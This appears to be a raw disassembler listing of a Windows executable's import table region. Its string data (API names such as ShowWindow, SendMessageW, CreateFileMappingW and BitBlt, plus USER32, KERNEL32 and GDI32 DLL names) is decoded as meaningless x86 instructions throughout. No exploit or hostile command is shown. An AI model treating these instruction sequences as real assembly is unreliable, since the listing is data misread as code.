  42870b:	jb     0x42877c
  42870d:	jo     0x428766
  42870f:	add    BYTE PTR [edi+0x2],bh
  428712:	push   ebx
  428713:	push   0x6957776f
  428718:	outs   dx,BYTE PTR ds:[esi]
  428719:	outs   dx,DWORD PTR fs:[esi]
  42871b:	ja     0x42871d
  42871d:	add    BYTE PTR [ebx],bl
  42871f:	add    BYTE PTR [ebx+0x61],al
  428722:	ins    BYTE PTR es:[edi],dx
  428723:	ins    BYTE PTR es:[edi],dx
  428724:	push   edi
  428725:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42872c:	outs   dx,DWORD PTR ds:[esi]
  42872d:	arpl   WORD PTR [edi+0x0],dx
  428730:	mov    dh,0x1
  428732:	dec    esp
  428733:	outs   dx,DWORD PTR ds:[esi]
  428734:	popa   
  428735:	fs dec ebp
  428737:	outs   dx,BYTE PTR gs:[esi]
  428739:	jne    0x42877c
  42873b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428742:	arpl   WORD PTR [eax+0x54],bp
  428745:	outs   dx,DWORD PTR ds:[esi]
  428746:	push   esp
  428747:	push   0x69577369
  42874c:	outs   dx,BYTE PTR ds:[esi]
  42874d:	outs   dx,DWORD PTR fs:[esi]
  42874f:	ja     0x428751
  428751:	add    BYTE PTR [eax],ah
  428753:	add    dl,BYTE PTR [ebx+0x63]
  428756:	jb     0x4287c7
  428758:	ins    BYTE PTR es:[edi],dx
  428759:	ins    BYTE PTR es:[edi],dx
  42875a:	push   edi
  42875b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428762:	add    BYTE PTR [eax],al
  428764:	pop    DWORD PTR [eax]
  428766:	inc    esp
  428767:	gs push di
  42876a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428771:	outs   dx,DWORD PTR ds:[esi]
  428772:	arpl   WORD PTR [edi+0x0],dx
  428775:	add    BYTE PTR [ecx],dh
  428777:	add    BYTE PTR [ebx+0x68],al
  42877a:	popa   
  42877b:	jb     0x4287cd
  42877d:	jb     0x4287e4
  42877f:	jbe    0x4287d8
  428781:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428788:	fs popa 
  42878a:	je     0x4287f1
  42878c:	push   edx
  42878d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428792:	xor    eax,DWORD PTR [ecx]
  428794:	inc    edi
  428795:	gs je  0x4287e5
  428798:	outs   dx,BYTE PTR gs:[esi]
  42879a:	jne    0x4287e5
  42879c:	je     0x428803
  42879e:	ins    DWORD PTR es:[edi],dx
  42879f:	dec    ecx
  4287a0:	inc    esp
  4287a1:	add    BYTE PTR ds:0x6e655302,ch
  4287a7:	fs dec esi
  4287a9:	outs   dx,DWORD PTR ds:[esi]
  4287aa:	je     0x428815
  4287ac:	data16 jns 0x4287fc
  4287af:	gs jae 0x428825
  4287b2:	popa   
  4287b3:	addr16 gs push edi
  4287b6:	add    BYTE PTR [eax],al
  4287b8:	mov    al,0x1
  4287ba:	dec    esp
  4287bb:	outs   dx,DWORD PTR ds:[esi]
  4287bc:	popa   
  4287bd:	fs dec ecx
  4287bf:	arpl   WORD PTR [edi+0x6e],bp
  4287c2:	push   edi
  4287c3:	add    BYTE PTR [ecx+0x57734901],ah
  4287c9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  4287d0:	popa   
  4287d1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4287d5:	add    BYTE PTR ds:0x74654701,dl
  4287db:	inc    esi
  4287dc:	outs   dx,DWORD PTR ds:[esi]
  4287dd:	jb     0x428844
  4287df:	addr16 jb 0x428851
  4287e2:	jne    0x428852
  4287e4:	fs push edi
  4287e6:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  4287ed:	add    DWORD PTR [edi+0x65],eax
  4287f0:	je     0x428849
  4287f2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4287f9:	js     0x42886f
  4287fb:	inc    ecx
  4287fc:	add    BYTE PTR [eax],al
  4287fe:	add    DWORD PTR ds:[edi+0x65],eax
  428802:	je     0x428851
  428804:	gs jae 0x42887a
  428807:	popa   
  428808:	addr16 gs push edi
  42880b:	add    BYTE PTR [ebx],ch
  42880d:	add    dl,BYTE PTR [ebx+0x65]
  428810:	outs   dx,BYTE PTR ds:[esi]
  428811:	fs dec ebp
  428813:	gs jae 0x428889
  428816:	popa   
  428817:	addr16 gs push edi
  42881a:	add    BYTE PTR [eax],al
  42881c:	das    
  42881d:	add    dl,BYTE PTR [ebx+0x65]
  428820:	je     0x428863
  428822:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428826:	gs push edi
  428828:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42882f:	add    dl,BYTE PTR [edx+0x65]
  428832:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42883a:	popa   
  42883b:	jae    0x4288b0
  42883d:	inc    ebp
  42883e:	js     0x428897
  428840:	add    BYTE PTR [eax],al
  428842:	and    DWORD PTR [edx],eax
  428844:	push   ebx
  428845:	outs   dx,BYTE PTR gs:[esi]
  428847:	fs inc esp
  428849:	ins    BYTE PTR es:[edi],dx
  42884a:	addr16 dec ecx
  42884c:	je     0x4288b3
  42884e:	ins    DWORD PTR es:[edi],dx
  42884f:	dec    ebp
  428850:	gs jae 0x4288c6
  428853:	popa   
  428854:	addr16 gs inc ecx
  428857:	add    BYTE PTR ds:0x74654701,bh
  42885d:	dec    ebp
  42885e:	gs jae 0x4288d4
  428861:	popa   
  428862:	addr16 gs push esp
  428865:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42886c:	inc    ebx
  42886d:	popa   
  42886e:	jae    0x4288d3
  428870:	popa   
  428871:	fs gs push edi
  428874:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42887b:	add    bh,bl
  42887d:	add    BYTE PTR [ebp+0x78],al
  428880:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428888:	jae    0x4288cf
  42888a:	js     0x42888c
  42888c:	repnz add DWORD PTR [eax+0x6f],edx
  428890:	jae    0x428906
  428892:	dec    ebp
  428893:	gs jae 0x428909
  428896:	popa   
  428897:	addr16 gs push edi
  42889a:	add    BYTE PTR [eax],al
  42889c:	add    DWORD PTR fs:[edi+0x65],eax
  4288a0:	je     0x4288f7
  4288a2:	jo     0x428908
  4288a4:	popa   
  4288a5:	je     0x42890c
  4288a7:	push   edx
  4288a8:	outs   dx,BYTE PTR ds:[si]
  4288aa:	add    BYTE PTR [eax],al
  4288ac:	mov    BYTE PTR [edx],al
  4288ae:	push   esp
  4288af:	popa   
  4288b0:	bound  esp,QWORD PTR [edx+0x65]
  4288b3:	fs push esp
  4288b5:	gs js  0x42892c
  4288b8:	dec    edi
  4288b9:	jne    0x42892f
  4288bb:	push   edi
  4288bc:	add    BYTE PTR [eax],al
  4288be:	test   eax,0x616f4c01
  4288c3:	fs inc edx
  4288c5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288cd:	add    BYTE PTR [edx+esi*2+0x61],al
  4288d1:	ja     0x428926
  4288d3:	je     0x428936
  4288d5:	je     0x42893c
  4288d7:	push   edi
  4288d8:	add    BYTE PTR [eax],al
  4288da:	ja     0x4288dd
  4288dc:	inc    edi
  4288dd:	gs je  0x428937
  4288e0:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4288e7:	js     0x42895d
  4288e9:	dec    esp
  4288ea:	outs   dx,BYTE PTR gs:[esi]
  4288ec:	addr16 je 0x428957
  4288ef:	push   edi
  4288f0:	add    BYTE PTR [eax],al
  4288f2:	cmp    BYTE PTR [eax],al
  4288f4:	inc    ebx
  4288f5:	push   0x70557261
  4288fa:	jo     0x428961
  4288fc:	jb     0x428940
  4288fe:	jne    0x428966
  428900:	push   di
  428902:	add    BYTE PTR [eax],al
  428904:	daa    
  428905:	add    DWORD PTR [edi+0x65],eax
  428908:	je     0x428955
  42890a:	gs jns 0x42896f
  42890d:	outs   dx,DWORD PTR ds:[esi]
  42890e:	popa   
  42890f:	jb     0x428975
  428911:	push   esp
  428912:	jns    0x428984
  428914:	add    BYTE PTR gs:[ebx+0x1],cl
  428918:	inc    edi
  428919:	gs je  0x42896c
  42891c:	jb     0x42898d
  42891e:	jo     0x428977
  428920:	add    BYTE PTR [eax],al
  428922:	dec    ebp
  428923:	add    BYTE PTR [ebx+0x6f],al
  428926:	jo     0x4289a1
  428928:	push   edx
  428929:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42892e:	sub    eax,0x61684300
  428933:	jb     0x428983
  428935:	gs js  0x4289ac
  428938:	push   edi
  428939:	add    BYTE PTR [eax+0x43734901],dl
  42893f:	push   0x6f4c7261
  428944:	ja     0x4289ab
  428946:	jb     0x428989
  428948:	add    BYTE PTR [eax],al
  42894a:	sub    BYTE PTR [ecx],al
  42894c:	inc    edi
  42894d:	gs je  0x42899c
  428950:	popa   
  428951:	jae    0x4289c7
  428953:	inc    ecx
  428954:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428958:	gs push eax
  42895a:	outs   dx,DWORD PTR ds:[esi]
  42895b:	jo     0x4289d2
  42895d:	jo     0x42895f
  42895f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428965:	fs push ebx
  428967:	je     0x4289db
  428969:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428970:	inc    edi
  428971:	gs je  0x4289cb
  428974:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	addr16 push edi
  42897e:	add    BYTE PTR [eax],al
  428980:	leave  
  428981:	add    DWORD PTR [ebp+0x61],ecx
  428984:	jo     0x4289dd
  428986:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  42898d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428994:	inc    ebx
  428995:	push   0x6f547261
  42899a:	dec    edi
  42899b:	gs ins DWORD PTR es:[edi],dx
  42899d:	push   edi
  42899e:	add    BYTE PTR [eax],al
  4289a0:	push   ebp
  4289a1:	push   ebx
  4289a2:	inc    ebp
  4289a3:	push   edx
  4289a4:	xor    esi,DWORD PTR [edx]
  4289a6:	cs fs ins BYTE PTR es:[edi],dx
  4289a9:	ins    BYTE PTR es:[edi],dx
  4289aa:	add    BYTE PTR [eax],al
  4289ac:	xchg   edx,eax
  4289ad:	add    edx,DWORD PTR [edx+0x74]
  4289b0:	ins    BYTE PTR es:[edi],dx
  4289b1:	dec    ecx
  4289b2:	outs   dx,BYTE PTR ds:[esi]
  4289b3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289bb:	jb     0x428a26
  4289bd:	outs   dx,BYTE PTR ds:[esi]
  4289be:	add    BYTE PTR [bp+0x74],ch
  4289c2:	fs ins BYTE PTR es:[edi],dx
  4289c4:	ins    BYTE PTR es:[edi],dx
  4289c5:	cs fs ins BYTE PTR es:[edi],dx
  4289c8:	ins    BYTE PTR es:[edi],dx
  4289c9:	add    BYTE PTR ds:0x74654702,al
  4289cf:	dec    esp
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	arpl   WORD PTR [ecx+0x6c],sp
  4289d4:	gs dec ecx
  4289d6:	outs   dx,BYTE PTR ds:[esi]
  4289d7:	outs   dx,WORD PTR ds:[esi]
  4289d9:	push   edi
  4289da:	add    BYTE PTR [eax],al
  4289dc:	inc    ebp
  4289dd:	add    al,BYTE PTR [edi+0x65]
  4289e0:	je     0x428a32
  4289e2:	jb     0x428a53
  4289e4:	arpl   WORD PTR [ecx+0x64],ax
  4289e7:	fs jb  0x428a4f
  4289ea:	jae    0x428a5f
  4289ec:	add    BYTE PTR [eax],al
  4289ee:	rol    DWORD PTR [eax],cl
  4289f0:	inc    ebx
  4289f1:	jb     0x428a58
  4289f3:	popa   
  4289f4:	je     0x428a5b
  4289f6:	inc    esi
  4289f7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4289ff:	outs   dx,BYTE PTR ds:[esi]
  428a00:	addr16 push edi
  428a02:	add    BYTE PTR [eax],al
  428a04:	sub    BYTE PTR [ebx+edx*2],al
  428a07:	gs je  0x428a52
  428a0a:	popa   
  428a0b:	outs   dx,BYTE PTR ds:[esi]
  428a0c:	fs ins BYTE PTR es:[edi],dx
  428a0e:	gs inc ebx
  428a10:	outs   dx,DWORD PTR ds:[esi]
  428a11:	jne    0x428a81
  428a13:	je     0x428a15
  428a15:	add    ah,bl
  428a17:	add    BYTE PTR [ebx+0x72],al
  428a1a:	gs popa 
  428a1c:	je     0x428a83
  428a1e:	dec    ebp
  428a1f:	popa   
  428a20:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a28:	pop    DWORD PTR [ecx]
  428a2a:	inc    edi
  428a2b:	gs je  0x428a6f
  428a2e:	je     0x428a9f
  428a30:	ins    DWORD PTR es:[edi],dx
  428a31:	dec    esi
  428a32:	popa   
  428a33:	ins    DWORD PTR es:[edi],dx
  428a34:	gs inc ecx
  428a36:	add    BYTE PTR [eax],al
  428a38:	pusha  
  428a39:	add    al,BYTE PTR [edi+0x65]
  428a3c:	je     0x428a91
  428a3e:	jns    0x428ab3
  428a40:	je     0x428aa7
  428a42:	ins    DWORD PTR es:[edi],dx
  428a43:	push   edi
  428a44:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a4b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a52:	jns    0x428a95
  428a54:	add    BYTE PTR [eax],al
  428a56:	aas    
  428a57:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a5b:	fs dec esp
  428a5d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a64:	add    BYTE PTR [eax],al
  428a66:	xchg   ecx,eax
  428a67:	add    al,BYTE PTR [edi+0x6c]
  428a6a:	outs   dx,DWORD PTR ds:[esi]
  428a6b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a6e:	inc    ecx
  428a6f:	ins    BYTE PTR es:[edi],dx
  428a70:	ins    BYTE PTR es:[edi],dx
  428a71:	outs   dx,DWORD PTR ds:[esi]
  428a72:	arpl   WORD PTR [eax],ax
  428a74:	xchg   edx,eax
  428a75:	add    al,0x56
  428a77:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428a7e:	jne    0x428ae5
  428a80:	jb     0x428afb
  428a82:	add    BYTE PTR [eax],al
  428a84:	test   DWORD PTR [ecx],0x46746547
  428a8a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428a92:	jb     0x428a95
  428a94:	inc    esi
  428a95:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428a9c:	jne    0x428b10
  428a9e:	arpl   WORD PTR [ebp+0x57],sp
  428aa1:	add    BYTE PTR [eax],bh
  428aa3:	add    ecx,DWORD PTR [ebp+0x6f]
  428aa6:	jbe    0x428b0d
  428aa8:	inc    esi
  428aa9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ab1:	popa   
  428ab2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ab9:	jo     0x428b2f
  428abb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428ac2:	inc    edi
  428ac3:	gs je  0x428b08
  428ac6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428acd:	jo     0x428b34
  428acf:	inc    ecx
  428ad0:	add    BYTE PTR [eax],al
  428ad2:	and    DWORD PTR [ebx+edx*2],eax
  428ad5:	gs je  0x428b1e
  428ad8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428ae0:	bound  esi,QWORD PTR [ebp+0x74]
  428ae3:	gs jae 0x428b27
  428ae6:	add    BYTE PTR [eax],al
  428ae8:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428aec:	jbe    0x428b53
  428aee:	inc    esi
  428aef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428af7:	add    BYTE PTR [ebx+0x6f],al
  428afa:	jo     0x428b75
  428afc:	inc    esi
  428afd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b05:	jne    0x428b6c
  428b07:	jb     0x428b82
  428b09:	push   eax
  428b0a:	gs jb  0x428b73
  428b0d:	outs   dx,DWORD PTR ds:[esi]
  428b0e:	jb     0x428b7d
  428b10:	popa   
  428b11:	outs   dx,BYTE PTR ds:[esi]
  428b12:	arpl   WORD PTR [ebp+0x43],sp
  428b15:	outs   dx,DWORD PTR ds:[esi]
  428b16:	jne    0x428b86
  428b18:	je     0x428b7f
  428b1a:	jb     0x428b1c
  428b1c:	sub    DWORD PTR [ebx+edx*2],eax
  428b1f:	gs je  0x428b6a
  428b22:	popa   
  428b23:	outs   dx,BYTE PTR ds:[esi]
  428b24:	fs ins BYTE PTR es:[edi],dx
  428b26:	gs dec ecx
  428b28:	outs   dx,BYTE PTR ds:[esi]
  428b29:	outs   dx,WORD PTR ds:[esi]
  428b2b:	jb     0x428b9a
  428b2d:	popa   
  428b2e:	je     0x428b99
  428b30:	outs   dx,DWORD PTR ds:[esi]
  428b31:	outs   dx,BYTE PTR ds:[esi]
  428b32:	add    BYTE PTR [eax],al
  428b34:	push   ss
  428b35:	add    DWORD PTR [ebp+0x6e],eax
  428b38:	je     0x428b9f
  428b3a:	jb     0x428b7f
  428b3c:	jb     0x428ba7
  428b3e:	je     0x428ba9
  428b40:	arpl   WORD PTR [ecx+0x6c],sp
  428b43:	push   ebx
  428b44:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b49:	outs   dx,BYTE PTR ds:[esi]
  428b4a:	add    BYTE PTR [eax],al
  428b4c:	jg     0x428b4f
  428b4e:	inc    esi
  428b4f:	outs   dx,DWORD PTR ds:[esi]
  428b50:	ins    BYTE PTR es:[edi],dx
  428b51:	fs push ebx
  428b53:	je     0x428bc7
  428b55:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b5c:	ins    BYTE PTR es:[edi],dx
  428b5d:	jae    0x428bd3
  428b5f:	jb     0x428bcd
  428b61:	outs   dx,BYTE PTR gs:[esi]
  428b63:	inc    ecx
  428b64:	add    BYTE PTR [eax],al
  428b66:	sahf   
  428b67:	add    DWORD PTR [edi+0x65],eax
  428b6a:	je     0x428baf
  428b6c:	outs   dx,DWORD PTR ds:[esi]
  428b6d:	ins    DWORD PTR es:[edi],dx
  428b6e:	ins    DWORD PTR es:[edi],dx
  428b6f:	push   esp
  428b70:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428b77:	add    BYTE PTR [edx+eax*1+0x47],dh
  428b7b:	gs je  0x428bd2
  428b7e:	push   0x64616572
  428b83:	push   esp
  428b84:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428b8b:	inc    ebp
  428b8c:	push   edx
  428b8d:	dec    esi
  428b8e:	inc    ebp
  428b8f:	dec    esp
  428b90:	xor    esi,DWORD PTR [edx]
  428b92:	cs fs ins BYTE PTR es:[edi],dx
  428b95:	ins    BYTE PTR es:[edi],dx
  428b96:	add    BYTE PTR [eax],al
  428b98:	mov    dh,0x1
  428b9a:	push   eax
  428b9b:	outs   dx,DWORD PTR ds:[esi]
  428b9c:	ins    BYTE PTR es:[edi],dx
  428b9d:	jns    0x428c06
  428b9f:	outs   dx,DWORD PTR ds:[esi]
  428ba0:	outs   dx,BYTE PTR ds:[esi]
  428ba1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428ba5:	gs je  0x428bf7
  428ba8:	bound  ebp,QWORD PTR [edx+0x65]
  428bab:	arpl   WORD PTR [edi+edx*2+0x0],si
  428baf:	add    BYTE PTR [ebx+0x6c654400],dh
  428bb5:	gs je  0x428c1d
  428bb8:	inc    esp
  428bb9:	inc    ebx
  428bba:	add    BYTE PTR [eax],al
  428bbc:	rol    DWORD PTR [ecx],1
  428bbe:	push   ebx
  428bbf:	gs ins BYTE PTR es:[edi],dx
  428bc1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428bc6:	push   0x65
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	jmp    0x428bcf
  428bce:	push   ebx
  428bcf:	gs je  0x428c1f
  428bd2:	popa   
  428bd3:	jo     0x428c22
  428bd5:	outs   dx,DWORD PTR ds:[esi]
  428bd6:	fs add BYTE PTR gs:[eax],al
  428bda:	leave  
  428bdb:	add    DWORD PTR [edx+0x6f],edx
  428bde:	jne    0x428c4e
  428be0:	fs push edx
  428be2:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428be7:	add    BYTE PTR [edx+0x69],al
  428bea:	je     0x428c2e
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	je     0x428bef
  428bef:	add    BYTE PTR [ebx+0x61655201],bh
  428bf5:	ins    BYTE PTR es:[edi],dx
  428bf6:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428bfd:	je     0x428c73
  428bff:	add    BYTE PTR gs:[eax],al
  428c02:	jge    0x428c05
  428c04:	inc    edi
  428c05:	gs je  0x428c5b
  428c08:	jns    0x428c7d
  428c0a:	je     0x428c71
  428c0c:	ins    DWORD PTR es:[edi],dx
  428c0d:	push   eax
  428c0e:	popa   
  428c0f:	ins    BYTE PTR es:[edi],dx
  428c10:	gs je  0x428c87
  428c13:	gs push ebp
  428c15:	jae    0x428c7c
  428c17:	add    BYTE PTR [eax+0x74654701],cl
  428c1d:	push   esp
  428c1e:	gs js  0x428c95
  428c21:	inc    ebp
  428c22:	js     0x428c98
  428c24:	outs   dx,BYTE PTR gs:[esi]
  428c26:	je     0x428c78
  428c28:	outs   dx,DWORD PTR ds:[esi]
  428c29:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c30:	push   ebx
  428c31:	arpl   WORD PTR [ecx+0x6c],sp
  428c34:	gs push esi
  428c36:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c3d:	inc    ebp
  428c3e:	js     0x428cb4
  428c40:	inc    ebp
  428c41:	js     0x428c43
  428c43:	add    bh,cl
  428c45:	add    DWORD PTR [ebx+0x65],edx
  428c48:	ins    BYTE PTR es:[edi],dx
  428c49:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c4e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c55:	add    DWORD PTR [ebx+0x65],edx
  428c58:	je     0x428cae
  428c5a:	gs js  0x428cd1
  428c5d:	inc    ebx
  428c5e:	outs   dx,DWORD PTR ds:[esi]
  428c5f:	ins    BYTE PTR es:[edi],dx
  428c60:	outs   dx,DWORD PTR ds:[esi]
  428c61:	jb     0x428c63
  428c63:	add    BYTE PTR [eax+0x74615001],ch
  428c69:	push   0x65526f54
  428c6e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428c76:	inc    ebx
  428c77:	outs   dx,DWORD PTR ds:[esi]
  428c78:	ins    DWORD PTR es:[edi],dx
  428c79:	bound  ebp,QWORD PTR [ecx+0x6e]
  428c7c:	gs push edx
  428c7e:	outs   dx,BYTE PTR ds:[si]
  428c80:	add    BYTE PTR [eax],al
  428c82:	lods   al,BYTE PTR ds:[esi]
  428c83:	add    BYTE PTR [ebx+0x72],al
  428c86:	gs popa 
  428c88:	je     0x428cef
  428c8a:	push   edx
  428c8b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428c90:	outs   dx,BYTE PTR ds:[esi]
  428c91:	dec    ecx
  428c92:	outs   dx,BYTE PTR ds:[esi]
  428c93:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428c9b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428c9f:	gs push esp
  428ca1:	outs   dx,DWORD PTR ds:[esi]
  428ca2:	add    BYTE PTR [eax],al
  428ca4:	mov    ds:0x65724300,al
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ecx
  428cad:	inc    ebx
  428cae:	push   edi
  428caf:	add    BYTE PTR [ebp+0x63655201],bh
  428cb5:	je     0x428d0d
  428cb7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cbf:	add    BYTE PTR [ebx+0x72],al
  428cc2:	gs popa 
  428cc4:	je     0x428d2b
  428cc6:	push   eax
  428cc7:	popa   
  428cc8:	ins    BYTE PTR es:[edi],dx
  428cc9:	gs je  0x428d40
  428ccc:	add    BYTE PTR gs:[edi+0x44],al
  428cd0:	dec    ecx
  428cd1:	xor    esi,DWORD PTR [edx]
  428cd3:	cs fs ins BYTE PTR es:[edi],dx
  428cd6:	ins    BYTE PTR es:[edi],dx
	...
  428cdf:	add    BYTE PTR ds:0x220,ah
	...
  428cfd:	add    BYTE PTR [eax],al
  428cff:	add    BYTE PTR [ebx],bl
  428d01:	lea    eax,[edx]
	...
  428d0f:	add    BYTE PTR [ecx+0x64],ch
  428d12:	js     0x428d7d
  428d14:	outs   dx,DWORD PTR fs:[esi]
  428d16:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d1a:	add    BYTE PTR [ebx+0x65],dl
  428d1d:	je     0x428d60
  428d1f:	outs   dx,BYTE PTR ds:[esi]
  428d20:	arpl   WORD PTR [eax+0x6f],bp
  428d23:	jb     0x428d74
  428d25:	jb     0x428d90
  428d27:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d2f:	add    BYTE PTR [eax],al
  428d31:	add    BYTE PTR [eax],al
  428d33:	add    BYTE PTR [eax-0x3bfffd7b],ch
  428d39:	test   DWORD PTR [edx],eax
  428d3b:	add    dh,dl
  428d3d:	test   DWORD PTR [edx],eax
  428d3f:	add    al,ch
  428d41:	test   DWORD PTR [edx],eax
  428d43:	add    BYTE PTR [eax],al
  428d45:	xchg   BYTE PTR [edx],al
  428d47:	add    BYTE PTR [esi+eax*4],dl
  428d4a:	add    al,BYTE PTR [eax]
  428d4c:	xchg   BYTE PTR cs:[edx],al
  428d4f:	add    BYTE PTR [eax],al
  428d51:	add    BYTE PTR [eax],al
  428d53:	add    BYTE PTR [eax-0x7a],dl
  428d56:	add    al,BYTE PTR [eax]
  428d58:	outs   dx,BYTE PTR ds:[esi]
  428d59:	xchg   BYTE PTR [edx],al
  428d5b:	add    BYTE PTR [esi+eax*4+0x2],bh
  428d5f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428d65:	xchg   BYTE PTR [edx],al
  428d67:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  428d6e:	add    al,BYTE PTR [eax]
  428d70:	rol    BYTE PTR [esi-0x7921fffe],1
  428d76:	add    al,BYTE PTR [eax]
  428d78:	lock xchg BYTE PTR [edx],al
  428d7b:	add    BYTE PTR [edx],al
  428d7d:	xchg   DWORD PTR [edx],eax
  428d7f:	add    BYTE PTR [eax],dl
  428d81:	xchg   DWORD PTR [edx],eax
  428d83:	add    BYTE PTR [esi],bl
  428d85:	xchg   DWORD PTR [edx],eax
  428d87:	add    BYTE PTR [eax],dh
  428d89:	xchg   DWORD PTR [edx],eax
  428d8b:	add    BYTE PTR [edi+eax*4],bh
  428d8e:	add    al,BYTE PTR [eax]
  428d90:	push   edx
  428d91:	xchg   DWORD PTR [edx],eax
  428d93:	add    BYTE PTR [edi+eax*4+0x2],ah
  428d97:	add    BYTE PTR [esi-0x79],dh
  428d9a:	add    al,BYTE PTR [eax]
  428d9c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428da3:	add    BYTE PTR [edx-0x47fffd79],ah
  428da9:	xchg   DWORD PTR [edx],eax
  428dab:	add    ah,al
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    dh,dl
  428db1:	xchg   DWORD PTR [edx],eax
  428db3:	add    ah,ch
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    dh,bh
  428db9:	xchg   DWORD PTR [edx],eax
  428dbb:	add    BYTE PTR [eax+ecx*4],cl
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	sbb    al,0x88
  428dc2:	add    al,BYTE PTR [eax]
  428dc4:	mov    BYTE PTR cs:[edx],al
  428dc7:	add    BYTE PTR [edx-0x78],al
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	pop    eax
  428dcd:	mov    BYTE PTR [edx],al
  428dcf:	add    BYTE PTR [edx-0x78],ch
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	jl     0x428d5e
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	mov    WORD PTR [eax-0x7763fffe],cs
  428dde:	add    al,BYTE PTR [eax]
  428de0:	lods   al,BYTE PTR ds:[esi]
  428de1:	mov    BYTE PTR [edx],al
  428de3:	add    BYTE PTR [esi-0x33fffd78],bh
  428de9:	mov    BYTE PTR [edx],al
  428deb:	add    dl,bl
  428ded:	mov    BYTE PTR [edx],al
  428def:	add    dl,dh
  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [ecx+ecx*4],al
  428df6:	add    al,BYTE PTR [eax]
  428df8:	push   ss
  428df9:	mov    DWORD PTR [edx],eax
  428dfb:	add    BYTE PTR [edx],ah
  428dfd:	mov    DWORD PTR [edx],eax
  428dff:	add    BYTE PTR [esi],ch
  428e01:	mov    DWORD PTR [edx],eax
  428e03:	add    BYTE PTR [edx],bh
  428e05:	mov    DWORD PTR [edx],eax
  428e07:	add    BYTE PTR [edx-0x77],cl
  428e0a:	add    al,BYTE PTR [eax]
  428e0c:	pusha  
  428e0d:	mov    DWORD PTR [edx],eax
  428e0f:	add    BYTE PTR [esi-0x77],ch
  428e12:	add    al,BYTE PTR [eax]
  428e14:	or     BYTE PTR [ecx-0x766dfffe],0x2
  428e1b:	add    BYTE PTR [eax],al
  428e1d:	add    BYTE PTR [eax],al
